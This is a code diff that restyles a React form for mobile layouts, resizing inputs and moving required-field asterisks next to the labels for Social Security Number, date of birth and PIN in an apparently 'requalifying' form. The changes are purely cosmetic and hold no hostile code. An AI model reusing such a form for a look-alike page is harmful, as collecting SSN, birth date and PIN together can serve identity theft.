@@ -200,6 +200,12 @@ export default function MainContent() {
             padding: 16px 4vw 16px 4vw !important;
             box-sizing: border-box !important;
           }
+          .form-row input {
+            width: 90vw !important;
+            max-width: 220px !important;
+            font-size: 16px !important;
+            padding: 8px 12px !important;
+          }
         }
       `}</style>
   <div className="logo-bg logo-section">
@@ -364,9 +370,9 @@ export default function MainContent() {
               <fieldset className="requalifyingborder">
                 <style>{`
                   .requalifyingborder {
-                    max-width: 1000px;
-                    width: 100%;
-                    padding: 64px 64px 48px 64px;
+                    max-width: 340px;
+                    width: 98%;
+                    padding: 32px 12px 32px 12px;
                     margin: 0 auto;
                     display: flex;
                     flex-direction: column;
@@ -379,19 +385,16 @@ export default function MainContent() {
                     align-items: center;
                     justify-content: center;
                     width: 100%;
+                    margin-bottom: 28px;
                   }
                 `}</style>
                 <div className="form-row">
                   <div>
-                    <p style={{ lineHeight: 'normal', fontSize: 16 }}>
+                    <p style={{ lineHeight: 'normal', fontSize: 16, display: 'flex', alignItems: 'center', gap: 6 }}>
                       <span style={{ letterSpacing: 'normal' }}>
                         ID (Social Security Number)
                       </span>
-                    </p>
-                  </div>
-                  <div>
-                    <p style={{ fontSize: 35, lineHeight: 'normal' }}>
-                      <span style={{ fontSize: 35, color: '#8B0000', letterSpacing: 'normal' }}>*</span>
+                      <span style={{ fontSize: 22, color: '#8B0000', letterSpacing: 'normal', marginLeft: 6 }}>*</span>
                     </p>
                   </div>
                   <div>
@@ -417,15 +420,11 @@ export default function MainContent() {
                 </div>
                 <div className="form-row">
                   <div>
-                    <p style={{ lineHeight: 'normal', fontSize: 16 }}>
+                    <p style={{ lineHeight: 'normal', fontSize: 16, display: 'flex', alignItems: 'center', gap: 6 }}>
                       <span style={{ letterSpacing: 'normal' }}>
                         DOB (MM/DD/YYYY)
                       </span>
-                    </p>
-                  </div>
-                  <div>
-                    <p style={{ fontSize: 35, lineHeight: 'normal' }}>
-                      <span style={{ fontSize: 35, color: '#8B0000', letterSpacing: 'normal' }}>*</span>
+                      <span style={{ fontSize: 22, color: '#8B0000', letterSpacing: 'normal', marginLeft: 6 }}>*</span>
                     </p>
                   </div>
                   <div>
@@ -452,15 +451,11 @@ export default function MainContent() {
                 </div>
                 <div className="form-row">
                   <div>
-                    <p style={{ lineHeight: 'normal', fontSize: 16 }}>
+                    <p style={{ lineHeight: 'normal', fontSize: 16, display: 'flex', alignItems: 'center', gap: 6 }}>
                       <span style={{ letterSpacing: 'normal' }}>
                         PIN (Personal Identification Number)
                       </span>
-                    </p>
-                  </div>
-                  <div>
-                    <p style={{ fontSize: 35, lineHeight: 'normal' }}>
-                      <span style={{ fontSize: 35, color: '#8B0000', letterSpacing: 'normal' }}>*</span>
+                      <span style={{ fontSize: 22, color: '#8B0000', letterSpacing: 'normal', marginLeft: 6 }}>*</span>
                     </p>
                   </div>
                   <div>
